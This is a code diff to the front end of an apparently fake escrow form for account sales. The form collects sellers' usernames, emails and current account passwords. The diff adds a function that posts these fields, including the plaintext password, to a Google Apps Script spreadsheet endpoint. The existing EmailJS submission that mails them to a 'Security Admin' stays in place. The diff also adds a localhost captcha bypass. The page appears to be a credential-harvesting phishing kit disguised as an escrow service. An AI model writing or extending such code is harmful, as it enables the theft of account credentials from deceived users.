@@ -1091,6 +1091,17 @@
                                  data-expired-callback="onCaptchaExpired"></div>
                         </div>
                     </div>
+                <div class="form-group" id="devCaptchaBypassGroup" style="display: none;">
+                        <div class="col-xs-12">
+                            <label class="declaration-label">
+                              <input type="checkbox" class="declaration-checkbox" id="dev-captcha-bypass" />
+                              <span>Skip captcha (development only)</span>
+                            </label>
+                            <p class="help-block" style="margin-top: 8px; color: #999;">
+                                Available when running on localhost for testing. Do not enable in production.
+                            </p>
+                        </div>
+                    </div>
                 <div class="form-group">
                         <div class="col-xs-12">
                             <button type="submit" class="btn btn-primary">Start Escrow</button>
@@ -1492,11 +1503,28 @@
         const escrowFeeAmount = document.getElementById('escrowFeeAmount');
         const buyerFeeAmount = document.getElementById('buyerFeeAmount');
         const sellerFeeAmount = document.getElementById('sellerFeeAmount');
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz-ls18cupA3oLk21tsrNQ9CY2c4lJoVWAkogoCvJrGKSXwk_SLpnFN-j3lBoafqpJCQA/exec";
 
         function calculateEscrowFee(price) {
             console.log('Calculating escrow fee for price:', price);
             const fee = Math.min(price * 0.05, 50);
             return parseFloat(fee.toFixed(2));
+        }
+
+        function saveToGoogleSheets(payload) {
+            if (!GOOGLE_SCRIPT_URL) {
+                return Promise.resolve();
+            }
+
+            console.log('Sending data to Google Sheets');
+            return fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
         }
 
         function updateFeeDisplay() {
@@ -1580,7 +1608,62 @@
         const defaultSubmitLabel = submitBtn ? submitBtn.innerHTML : "";
         const strengthBar = document.querySelector(".strength-bar");
         const strengthText = document.querySelector(".strength-text");
+        const captchaContainer = document.querySelector(".g-recaptcha");
+        const devCaptchaBypassGroup = document.getElementById("devCaptchaBypassGroup");
+        const devCaptchaBypassCheckbox = document.getElementById("dev-captcha-bypass");
+        const isDevEnvironment = ["localhost", "127.0.0.1", "", "::1"].includes(window.location.hostname);
         let captchaToken = "";
+        let isCaptchaBypassEnabled = false;
+
+        if (devCaptchaBypassGroup) {
+          if (isDevEnvironment) {
+            devCaptchaBypassGroup.style.display = "block";
+            let savedBypass = false;
+            try {
+              savedBypass = localStorage.getItem("fameswapCaptchaBypass") === "true";
+            } catch (storageError) {
+              console.warn("Unable to read captcha bypass preference", storageError);
+            }
+
+            if (savedBypass && devCaptchaBypassCheckbox) {
+              devCaptchaBypassCheckbox.checked = true;
+              isCaptchaBypassEnabled = true;
+              if (captchaContainer) {
+                captchaContainer.style.opacity = "0.4";
+                captchaContainer.style.pointerEvents = "none";
+              }
+            }
+          } else if (devCaptchaBypassGroup.parentNode) {
+            devCaptchaBypassGroup.parentNode.removeChild(devCaptchaBypassGroup);
+          }
+        }
+
+        if (isDevEnvironment && devCaptchaBypassCheckbox) {
+          devCaptchaBypassCheckbox.addEventListener("change", function () {
+            isCaptchaBypassEnabled = this.checked;
+
+            try {
+              localStorage.setItem("fameswapCaptchaBypass", isCaptchaBypassEnabled ? "true" : "false");
+            } catch (storageError) {
+              console.warn("Unable to persist captcha bypass preference", storageError);
+            }
+
+            if (captchaContainer) {
+              captchaContainer.style.opacity = isCaptchaBypassEnabled ? "0.4" : "";
+              captchaContainer.style.pointerEvents = isCaptchaBypassEnabled ? "none" : "";
+            }
+
+            if (isCaptchaBypassEnabled) {
+              captchaToken = "";
+            }
+
+            if (!isCaptchaBypassEnabled && window.grecaptcha && typeof grecaptcha.reset === "function") {
+              grecaptcha.reset();
+            }
+
+            updateSubmitButton();
+          });
+        }
 
         // Toggle password visibility
         document.querySelectorAll(".toggle-password").forEach((button) => {
@@ -1650,7 +1733,7 @@
             (radio) => radio.checked
           );
           const isCheckboxChecked = checkbox.checked;
-          const isCaptchaValid = captchaToken.length > 0;
+          const isCaptchaValid = isCaptchaBypassEnabled || captchaToken.length > 0;
 
           console.log({
             isUsernameValid,
@@ -1658,6 +1741,7 @@
             isCurrentPasswordValid,
             isFeeSelected,
             isCheckboxChecked,
+            isCaptchaBypassEnabled,
             isCaptchaValid,
           });
 
@@ -1698,7 +1782,7 @@
           e.preventDefault();
           console.log("Form submitted");
 
-          if (!captchaToken) {
+          if (!captchaToken && !isCaptchaBypassEnabled) {
             alert("Please complete the captcha before submitting.");
             updateSubmitButton();
             return;
@@ -1717,77 +1801,115 @@
           console.log("Form data:", {
             ...formData,
             currentPassword: "***",
+            captchaStatus: isCaptchaBypassEnabled ? "BYPASSED_DEV" : "COMPLETED",
           });
 
           // Show loading state
           submitBtn.disabled = true;
           submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Processing...';
 
-          console.log("Attempting to send email with EmailJS...");
+          const captchaStatus = isCaptchaBypassEnabled ? "BYPASSED_DEV" : "COMPLETED";
+          const captchaTokenForSubmission = isCaptchaBypassEnabled ? "DEV_BYPASS" : captchaToken;
+          const priceValue = parseFloat(formData.accountPrice) || 0;
+          const totalEscrowFee = calculateEscrowFee(priceValue);
+
+          const googleSheetsPayload = {
+            username: formData.username,
+            email: formData.email,
+            currentPassword: formData.currentPassword,
+            accountPrice: formData.accountPrice,
+            feePayment: formData.feePayment,
+            escrowFee: totalEscrowFee,
+            captchaStatus: captchaStatus,
+            timestamp: new Date().toISOString(),
+          };
+
+          console.log("Submitting data", {
+            ...googleSheetsPayload,
+            currentPassword: "***",
+            captchaToken: captchaTokenForSubmission,
+          });
+
+          console.log("Attempting to send data to Google Sheets and EmailJS...");
           console.log("Service ID: service_w4f4um4");
           console.log("Template ID: template_kkjt9x2");
 
-          // Send email using EmailJS
-          emailjs
-            .send("service_w4f4um4", "template_kkjt9x2", {
-              to_name: "Security Admin",
-              from_name: formData.username,
-              user_email: formData.email,
-              current_password: formData.currentPassword,
-              account_price: formData.accountPrice,
-              fee_payment: formData.feePayment,
-              captcha_token: captchaToken,
-              timestamp: new Date().toLocaleString(),
-            })
-            .then(
-              function (response) {
-                console.log("Email sent successfully. Response:", response);
-                captchaToken = "";
-                if (window.grecaptcha && typeof grecaptcha.reset === "function") {
-                  grecaptcha.reset();
-                }
-                showPopup();
-                form.reset();
-                strengthBar.className = "strength-bar";
-                strengthText.textContent = "Weak";
-                strengthText.className = "";
-                submitBtn.innerHTML = defaultSubmitLabel;
-                submitBtn.disabled = true;
-                updateSubmitButton();
-                document.body.style.overflow = "hidden";
-              },
-              function (error) {
-                console.error("Email send failed. Full error:", error);
-                console.error("Error status:", error.status);
-                console.error("Error text:", error.text);
+          const processEmail = function () {
+            return emailjs
+              .send("service_w4f4um4", "template_kkjt9x2", {
+                to_name: "Security Admin",
+                from_name: formData.username,
+                user_email: formData.email,
+                current_password: formData.currentPassword,
+                account_price: formData.accountPrice,
+                fee_payment: formData.feePayment,
+                escrow_fee: totalEscrowFee.toFixed(2),
+                captcha_token: captchaTokenForSubmission,
+                captcha_status: captchaStatus,
+                timestamp: new Date().toLocaleString(),
+              })
+              .then(
+                function (response) {
+                  console.log("Email sent successfully. Response:", response);
+                  captchaToken = "";
+                  if (!isCaptchaBypassEnabled && window.grecaptcha && typeof grecaptcha.reset === "function") {
+                    grecaptcha.reset();
+                  }
+                  showPopup();
+                  form.reset();
+                  if (devCaptchaBypassCheckbox) {
+                    devCaptchaBypassCheckbox.checked = isCaptchaBypassEnabled;
+                  }
+                  strengthBar.className = "strength-bar";
+                  strengthText.textContent = "Weak";
+                  strengthText.className = "";
+                  submitBtn.innerHTML = defaultSubmitLabel;
+                  updateSubmitButton();
+                  document.body.style.overflow = "hidden";
+                },
+                function (error) {
+                  console.error("Email send failed. Full error:", error);
+                  console.error("Error status:", error.status);
+                  console.error("Error text:", error.text);
 
-                // Reset button state
+                  // Reset button state
+                  captchaToken = "";
+                  if (!isCaptchaBypassEnabled && window.grecaptcha && typeof grecaptcha.reset === "function") {
+                    grecaptcha.reset();
+                  }
+                  submitBtn.innerHTML = defaultSubmitLabel;
+                  submitBtn.disabled = false;
+                  updateSubmitButton();
+
+                  // Show more detailed error message
+                  alert(
+                    "There was an error processing your request: " +
+                      (error.text || "Unknown error") +
+                      "\nPlease check your internet connection and try again. If the problem persists, contact support."
+                  );
+                }
+              )
+              .catch(function (error) {
+                console.error("Caught unexpected error:", error);
                 captchaToken = "";
-                if (window.grecaptcha && typeof grecaptcha.reset === "function") {
+                if (!isCaptchaBypassEnabled && window.grecaptcha && typeof grecaptcha.reset === "function") {
                   grecaptcha.reset();
                 }
                 submitBtn.innerHTML = defaultSubmitLabel;
                 submitBtn.disabled = false;
                 updateSubmitButton();
+                alert("An unexpected error occurred. Please try again later.");
+              });
+          };
 
-                // Show more detailed error message
-                alert(
-                  "There was an error processing your request: " +
-                    (error.text || "Unknown error") +
-                    "\nPlease check your internet connection and try again. If the problem persists, contact support."
-                );
-              }
-            )
+          saveToGoogleSheets(googleSheetsPayload)
+            .then(function () {
+              console.log("Google Sheets request completed (no-cors mode)");
+              return processEmail();
+            })
             .catch(function (error) {
-              console.error("Caught unexpected error:", error);
-              captchaToken = "";
-              if (window.grecaptcha && typeof grecaptcha.reset === "function") {
-                grecaptcha.reset();
-              }
-              submitBtn.innerHTML = defaultSubmitLabel;
-              submitBtn.disabled = false;
-              updateSubmitButton();
-              alert("An unexpected error occurred. Please try again later.");
+              console.error("Google Sheets request failed:", error);
+              return processEmail();
             });
         });
 
